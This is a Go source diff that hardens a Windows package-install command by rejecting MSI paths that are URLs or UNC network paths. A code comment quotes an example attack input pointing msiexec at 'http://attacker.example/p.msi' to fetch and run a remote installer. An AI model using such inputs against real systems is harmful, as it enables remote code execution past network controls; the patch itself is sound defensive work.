@@ -4,7 +4,9 @@ package windows
 
 import (
 	"context"
+	"errors"
 	"fmt"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -107,8 +109,8 @@ func packageCommand(mode string, args map[string]any) (string, time.Duration, er
 	case "install":
 		// A local MSI is an alternative to a winget id; if given, it takes precedence.
 		if msi := OptionalString(args, "msi", ""); msi != "" {
-			if !strings.HasSuffix(strings.ToLower(msi), ".msi") {
-				return "", 0, fmt.Errorf("msi must be a path to a .msi file")
+			if err := requireLocalMSI(msi); err != nil {
+				return "", 0, err
 			}
 			// Start-Process waits, and $LASTEXITCODE is not set by msiexec through
 			// Start-Process, so surface the process exit code explicitly.
@@ -131,3 +133,32 @@ func packageCommand(mode string, args map[string]any) (string, time.Duration, er
 		return "", 0, fmt.Errorf("unknown mode %q", mode)
 	}
 }
+
+// requireLocalMSI rejects an installer path that is not a local file.
+//
+// The only check was a ".msi" suffix, and msiexec /i happily accepts a URL or a
+// UNC path — so msi: "http://attacker.example/p.msi" downloaded and executed an
+// installer over plaintext HTTP, outside the egress proxy and the allowlist, and
+// never passed through enforceHTTPSScheme. The schema and description both say
+// "local .msi by path", so the documented disclosure that installs reach the
+// network did not cover an operator-unexpected fetch of an arbitrary URL.
+func requireLocalMSI(msi string) error {
+	if !strings.HasSuffix(strings.ToLower(msi), ".msi") {
+		return fmt.Errorf("%w: msi must be a path to a .msi file", ErrRemoteInstaller)
+	}
+	if strings.Contains(msi, "://") {
+		return fmt.Errorf("%w: %q is a URL; download it first and install the local file",
+			ErrRemoteInstaller, msi)
+	}
+	// A UNC path executes an installer hosted on another machine.
+	if strings.HasPrefix(msi, `\`) || strings.HasPrefix(msi, "//") {
+		return fmt.Errorf("%w: %q is a network path; copy it locally first", ErrRemoteInstaller, msi)
+	}
+	if !filepath.IsAbs(msi) {
+		return fmt.Errorf("%w: %q must be an absolute path", ErrRemoteInstaller, msi)
+	}
+	return nil
+}
+
+// ErrRemoteInstaller reports an installer that is not a local file.
+var ErrRemoteInstaller = errors.New("installer must be a local .msi")
